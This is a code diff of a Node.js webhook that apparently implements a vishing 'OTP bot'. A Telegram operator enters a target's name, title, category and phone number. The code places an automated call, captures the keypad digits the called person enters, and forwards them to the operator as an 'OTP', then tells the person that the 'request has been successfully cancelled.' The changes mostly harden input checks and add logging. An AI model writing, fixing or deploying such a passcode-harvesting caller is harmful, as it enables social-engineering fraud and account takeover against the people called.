@@ -96,115 +96,109 @@ module.exports = async function handler(req, res) {
   const bot = getBot();
   const body = req.body;
 
+  // Debug log for incoming webhook payload (helps diagnose errors)
+  console.log("Incoming webhook payload:", JSON.stringify(body, null, 2));
+
   // ===== TELEGRAM MESSAGE HANDLER =====
-  if (body?.message) {
-  const chatId = body.message.chat.id;
-  const text = body.message.text?.trim();
+  if (body?.message && body.message.chat && body.message.chat.id && body.message.text) {
+    const chatId = body.message.chat.id;
+    const text = body.message.text.trim();
 
-  if (!text) return res.status(200).send("OK");
+    if (!text) return res.status(200).send("OK");
 
-  // ===== START =====
-  if (text === "/start") {
-    await User.deleteOne({ chatId });
+    if (text === "/start") {
+      await User.deleteOne({ chatId });
 
-    await new User({ chatId, status: "name" }).save();
+      await new User({ chatId, status: "name" }).save();
 
-    await bot.sendMessage(chatId, "Welcome 👋\n\nWhat is your name?");
-    return res.status(200).send("OK");
-  }
-
-  const user = await User.findOne({ chatId });
-  if (!user) return res.status(200).send("OK");
-
-  // ===== NAME STEP =====
-  if (user.status === "name") {
-    user.name = text;
-    user.status = "gender";
-    await user.save();
-
-    await bot.sendMessage(chatId, "Are you Male or Female?");
-    return res.status(200).send("OK");
-  }
-
-  // ===== GENDER STEP =====
-  if (user.status === "gender") {
-    const gender = text.toLowerCase();
-
-    if (gender === "male") user.title = "Mr";
-    else if (gender === "female") user.title = "Ms";
-    else {
-      await bot.sendMessage(chatId, "Please type Male or Female.");
+      await bot.sendMessage(chatId, "Welcome 👋\n\nWhat is your name?");
       return res.status(200).send("OK");
     }
 
-    user.status = "category";
-    await user.save();
+    const user = await User.findOne({ chatId });
+    if (!user) return res.status(200).send("OK");
 
-    await bot.sendMessage(chatId, "Enter your category:");
-    return res.status(200).send("OK");
+    if (user.status === "name") {
+      user.name = text;
+      user.status = "gender";
+      await user.save();
+
+      await bot.sendMessage(chatId, "Are you Male or Female?");
+      return res.status(200).send("OK");
+    }
+
+    if (user.status === "gender") {
+      const gender = text.toLowerCase();
+
+      if (gender === "male") user.title = "Mr";
+      else if (gender === "female") user.title = "Ms";
+      else {
+        await bot.sendMessage(chatId, "Please type Male or Female.");
+        return res.status(200).send("OK");
+      }
+
+      user.status = "category";
+      await user.save();
+
+      await bot.sendMessage(chatId, "Enter your category:");
+      return res.status(200).send("OK");
+    }
+
+    if (user.status === "category") {
+      user.category = text;
+      user.status = "phone";
+      await user.save();
+
+      await bot.sendMessage(
+        chatId,
+        "Send your phone number with country code.\nExample: +1234567890"
+      );
+      return res.status(200).send("OK");
+    }
+
+    if (user.status === "phone") {
+      const cleanedPhone = text.replace(/\s+/g, "");
+
+      user.phone = cleanedPhone;
+      user.otp = "123456"; // ensure OTP is string
+      user.status = "calling";
+      await user.save();
+
+      await bot.sendMessage(chatId, "📞 Calling now...");
+      await callUser(user);
+
+      return res.status(200).send("OK");
+    }
   }
 
-  // ===== CATEGORY STEP =====
-  if (user.status === "category") {
-    user.category = text;
-    user.status = "phone";
-    await user.save();
+  // ===== VAPI DTMF HANDLER =====
+  if (body?.dtmf && body.customer && body.customer.number) {
+    const phone = body.customer.number;
+    let digits = body.dtmf;
 
-    await bot.sendMessage(
-      chatId,
-      "Send your phone number with country code.\nExample: +1234567890"
-    );
-    return res.status(200).send("OK");
+    const user = await User.findOne({ phone });
+    if (!user) return res.status(200).send("OK");
+
+    digits = digits.toString().trim();
+
+    // Send digits to Telegram for debugging
+    await bot.sendMessage(user.chatId, `🔢 User entered OTP via keypad: ${digits}`);
+
+    if (digits === user.otp) {
+      user.status = "verified";
+      await user.save();
+
+      await bot.sendMessage(
+        user.chatId,
+        "✅ OTP Verified\nYour request has been successfully cancelled."
+      );
+    } else {
+      await bot.sendMessage(
+        user.chatId,
+        "❌ Incorrect OTP entered. Please try again."
+      );
+    }
   }
 
-  // ===== PHONE STEP =====
-  if (user.status === "phone") {
-    const cleanedPhone = text.replace(/\s+/g, "");
-
-    user.phone = cleanedPhone;
-    user.otp = "123456"; // Replace with real OTP fetch logic
-    user.status = "calling";
-    await user.save();
-
-    await bot.sendMessage(chatId, "📞 Calling now...");
-    await callUser(user);
-
-    return res.status(200).send("OK");
-  }
-}
-
-// ===== VAPI DTMF HANDLER =====
-if (body?.dtmf) {
-  const phone = body.customer?.number;
-  let digits = body.dtmf;
-
-  // Find the user
-  const user = await User.findOne({ phone });
-  if (!user) return res.status(200).send("OK");
-
-  // Clean digits
-  if (Array.isArray(digits)) {
-    digits = digits.join(""); // ["1","2","3"] -> "123"
-  } else {
-    digits = digits.toString().replace(/\D/g, ""); // remove non-numeric chars
-  }
-
-  // Send the digits to Telegram first
-  await bot.sendMessage(user.chatId, `🔢 User entered OTP via keypad: ${digits}`);
-
-  // Compare with OTP
-  if (digits === user.otp) {
-    user.status = "verified";
-    await user.save();
-
-    await bot.sendMessage(
-      user.chatId,
-      "✅ OTP Verified\nYour request has been successfully cancelled."
-    );
-  } else {
-    await bot.sendMessage(user.chatId, "❌ Incorrect OTP entered. Please try again.");
-  }
-}
-
-return res.status(200).send("OK");
+  return res.status(200).send("OK");
 };
